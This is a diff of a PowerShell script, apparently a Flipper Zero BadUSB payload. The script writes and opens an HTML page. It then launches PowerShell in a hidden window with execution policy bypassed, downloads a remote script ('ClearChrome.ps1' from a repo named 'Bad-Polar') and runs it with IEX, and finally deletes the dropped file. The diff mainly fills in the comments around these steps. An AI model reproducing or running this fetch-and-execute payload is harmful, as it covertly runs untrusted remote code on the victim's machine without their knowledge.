@@ -19,33 +19,32 @@ $html = @"
 </html>
 "@
 
-# Get the current logged in username 
-$username = $env:USERNAME
+# Get the path to the user's downloads folder
+$downloadsPath = [Environment]::GetFolderPath("MyDocuments")
 
 # Combine the base path and file name
-$filePath = Join-Path -Path "C:\Users\$username\" -ChildPath "index.html"
+$filePath = Join-Path -Path $downloadsPath -ChildPath "index.html"
 
-# 
+# Delay for 2 seconds
 Start-Sleep -Seconds 2
 
 # Create the file
 Set-Content -Path $filePath -Value $html
 
-# 
+# Delay for 2 seconds
 Start-Sleep -Seconds 2
 
-# 
+# Open the file in the default web browser
 Start-Process $filePath
 
 # Delay for 2 seconds
 Start-Sleep -Seconds 2
 
-#
+# Download something using the command you provided
 powershell -w h -NoP -Ep Bypass -Command "& { IEX (Invoke-WebRequest https://raw.githubusercontent.com/itsweekly/FlipperZero-Bad-Polar/main/Proxy/ClearChrome.ps1).Content }"
 
 # Delay for 2 seconds
 Start-Sleep -Seconds 2
-
 
 # Delete the file
 Remove-Item -Path $filePath
